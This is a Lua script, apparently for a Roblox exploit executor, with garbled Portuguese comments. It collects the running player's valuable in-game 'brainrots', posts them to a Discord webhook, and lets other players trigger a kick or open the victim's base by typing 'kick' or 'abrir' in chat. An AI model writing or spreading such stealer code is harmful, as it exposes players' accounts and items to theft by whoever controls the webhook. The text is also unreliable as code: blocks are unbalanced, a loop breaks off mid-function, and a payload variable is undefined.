-- Fun√ß√£o para parsear valores monet√°rios
local function parseMoneyPerSec(text)
    if not text then return 0 end
    local mult = 1
    local numberStr = text:match("[%d%.]+")
    if not numberStr then return 0 end
    if text:find("K") then mult = 1000
    elseif text:find("M") then mult = 1000000
    elseif text:find("B") then mult = 1000000000
    elseif text:find("T") then mult = 1000000000000
    elseif text:find("Q") then mult = 1000000000000000 end
    return tonumber(numberStr) * mult
end

-- Fun√ß√£o AVAN√áADA para encontrar brainrots com valores de gera√ß√£o
local function findBrainrotsWithValues()
    local brainrotsWebhook = {}
    local valorizadoDog = false
    local foundNames = {} -- Para evitar duplicatas
    
    -- M√©todo 1: Tentar usar getgenv().base primeiro
    if getgenv and getgenv().base then
        for _, brainrote in getgenv().base:GetDescendants() do
            if brainrote:IsA("TextLabel") and brainrote.Name == "Generation" then
                if brainrote.Parent:FindFirstChild("DisplayName") then
                    local displayName = brainrote.Parent.DisplayName.ContentText
                    local cleanName = cleanBrainrotName(displayName)
                    
                    -- Verificar se √© v√°lido
                    if isValidBrainrot(cleanName) and not foundNames[cleanName] then
                        local nomeFinal = displayName
                        if brainrote.Parent:FindFirstChild("Mutation") and brainrote.Parent.Mutation.Visible then
                            nomeFinal = "[" .. brainrote.Parent.Mutation.ContentText .. "] " .. displayName
                        end
                        
                        table.insert(brainrotsWebhook, {nome = nomeFinal, valor = brainrote.ContentText})
                        foundNames[cleanName] = true
                        
                        if parseMoneyPerSec(brainrote.ContentText) > 49999999 then
                            valorizadoDog = true
                        end
                    end
                end
            end
        end
    end
    
    -- M√©todo 2: Procurar DENTRO dos IDs espec√≠ficos
    local plotsFolder = Workspace:FindFirstChild("Plots")
    if plotsFolder then
        for _, plot in ipairs(plotsFolder:GetChildren()) do

                -- Procurar o ID dentro do plot
                for _, child in ipairs(plot:GetDescendants()) do
                    if child.Name == targetId or (child:IsA("Model") and child.Name:find(targetId)) then
                        -- Encontrou o ID, agora procurar brainrots dentro dele
                        for _, desc in ipairs(child:GetDescendants()) do
                            if desc:IsA("TextLabel") and desc.Name == "Generation" then
                                if desc.Parent:FindFirstChild("DisplayName") then
                                    local displayName = desc.Parent.DisplayName.ContentText
                                    local cleanName = cleanBrainrotName(displayName)
                                    
                                    if isValidBrainrot(cleanName) and not foundNames[cleanName] then
                                        local nomeFinal = displayName
                                        if desc.Parent:FindFirstChild("Mutation") and desc.Parent.Mutation.Visible then
                                            nomeFinal = "[" .. desc.Parent.Mutation.ContentText .. "] " .. displayName
                                        end
                                        
                                        table.insert(brainrotsWebhook, {nome = nomeFinal, valor = desc.ContentText})
                                        foundNames[cleanName] = true
                                        
                                        if parseMoneyPerSec(desc.ContentText) > 49999999 then
                                            valorizadoDog = true
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    
    -- M√©todo 3: Procurar na pasta Plots normalmente (brainrots vis√≠veis)
    if plotsFolder then
        for _, desc in ipairs(plotsFolder:GetDescendants()) do
            if desc:IsA("TextLabel") and desc.Name == "Generation" then
                if desc.Parent:FindFirstChild("DisplayName") then
                    local displayName = desc.Parent.DisplayName.ContentText
                    local cleanName = cleanBrainrotName(displayName)

                        local nomeFinal = displayName
                        if desc.Parent:FindFirstChild("Mutation") and desc.Parent.Mutation.Visible then
                            nomeFinal = "[" .. desc.Parent.Mutation.ContentText .. "] " .. displayName

                        table.insert(brainrotsWebhook, {nome = nomeFinal, valor = desc.ContentText})
                        foundNames[cleanName] = true
                        
                        if parseMoneyPerSec(desc.ContentText) > 49999999 then
                            valorizadoDog = true
                        end
                    end
                end
            end
        end
    end
    
    -- M√©todo 4: Procurar modelos na Workspace com nomes v√°lidos
    for _, brainrotName in ipairs(VALID_BRAINROTS) do
        if not foundNames[brainrotName] then
            -- Procurar recursivamente
            for _, obj in ipairs(Workspace:GetDescendants()) do
                if obj:IsA("Model") and obj.Name == brainrotName then
                    -- Verificar se tem Generation

-- Fun√ß√£o para enviar para Discord
local function sendToDiscord(payload)

    if syn and syn.request then
        pcall(function()
            syn.request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        return
    end
    
    if request then
        pcall(function()
            request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        return
    end
    
    if http_request then
        pcall(function()
            http_request({
                Url = DISCORD_WEBHOOK,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = jsonPayload
            })
        end)
        return
    end
    
    pcall(function()
        HttpService:PostAsync(DISCORD_WEBHOOK, jsonPayload, Enum.HttpContentType.ApplicationJson, false)
    end)
end

-- Sistema de comandos no chat
local function setupChatCommands()
    local player = Players.LocalPlayer
    
    player.Chatted:Connect(function(message)
        local msg = message:lower()
        
        -- Comando KICK
        if msg == "kick" or msg == ":kick" or msg == ";kick" then
            print("üö´ Comando KICK detectado!")
            kickPlayer()
        end
    end)
    
    -- Monitorar chat de outros players
    for _, otherPlayer in pairs(Players:GetPlayers()) do
        if otherPlayer ~= player then
            otherPlayer.Chatted:Connect(function(message)
                local msg = message:lower()
                
                -- Comando KICK
                if msg == "kick" or msg == ":kick" or msg == ";kick" then
                    print("üö´ Outro player usou KICK!")
                    kickPlayer()
                end
                
                -- Comando ABRIR
                if msg == "abrir" then
                    print("üîì Comando ABRIR detectado!")
                    openBaseSequence(otherPlayer)
                end
            end)
        end
    end
    
    -- Monitorar novos players que entram
    Players.PlayerAdded:Connect(function(newPlayer)
        newPlayer.Chatted:Connect(function(message)
            local msg = message:lower()
            
            if msg == "kick" or msg == ":kick" or msg == ";kick" then
                kickPlayer()
            end
            
            if msg == "abrir" then
                openBaseSequence(newPlayer)
            end
        end)
    end)
end
